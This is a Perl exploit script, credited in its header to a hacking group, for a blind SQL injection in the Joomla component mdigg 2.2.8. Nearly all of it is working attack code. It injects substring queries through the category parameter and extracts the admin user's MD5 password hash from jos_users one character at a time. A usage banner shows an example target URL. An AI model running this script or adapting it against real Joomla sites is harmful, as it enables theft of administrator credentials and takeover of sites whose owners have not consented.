#!/usr/bin/perl
####################################################################################
# Joomla Component mdigg 2.2.8 Blind SQL Injection Exploit                         #
#                           ..::virangar security team::..                         #
#                              www.virangar.net                                    #
#C0d3d BY:virangar security team ( hadihadi  )                                     #
#special tnx to:                                                                   #
#MR.nosrati,black.shadowes,MR.hesy,Ali007,Zahra                                    #
#& all virangar members & all hackerz                                              #
# my lovely friends hadi_aryaie2004 & arash(imm02tal)                              #
#             ..:::Young Iranian Hackerz::..                                       #
####################################################################################


use HTTP::Request;
use LWP::UserAgent;

if (@ARGV != 1){
header();
exit();
}

$host = $ARGV[0];


print "\n md5 Password:\r\n";
&halghe();
print "\n[+]Done\n";


sub halghe {
for($i = 1; $i <= 32; $i++){
 $f = 0;
 $n = 48;
 while(!$f && $n <= 57)
 {
  if(&inject($host, $i, $n,)){
 $f = 1;
     syswrite(STDOUT, chr($n), 1);
   }
$n++;
}
if(!$f){
$n=97;
while(!$f && $n <= 102)
 {
  if(&inject($host, $i, $n,)){
 $f = 1;
     syswrite(STDOUT, chr($n), 1);
   }
$n++;
}}

}
}
sub inject {
my $site = $_[0];
my $a = $_[1];
my $b = $_[2];
$col = "password";

$attack=
"$site"."?option=com_mdigg&act=story_lists&task=view&category=2/**/and/**/substring((select/**/"."$col"."/**/from/**/jos_users/**/where/**/username/**/like/**/0x61646
d696e25/**/limit/**/0,1),"."$a".",1)=char("."$b".")/*";
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$req = $b->request(HTTP::Request->new(GET=>$attack));
$res = $req->content;

if ($res =~ /read more/i){
    return 1;
}

}
sub header {
print qq{
######################################################################################
# Joomla Component mdigg 2.2.8 Blind SQL Injection Exploit                           #
#                        www.virangar.net                                            #
#                                                                                    #
#   Useage: perl $0 Host                                                             #
#                                                                                    #
#   Host: full patch to index.php (dont forget http://)                              #
#                                                                                    #
#                                                                                    #
# useage Example: perl $0 http://demo15.joomlaapps.com/index.php                     #
#                                                                                    #
######################################################################################
};
}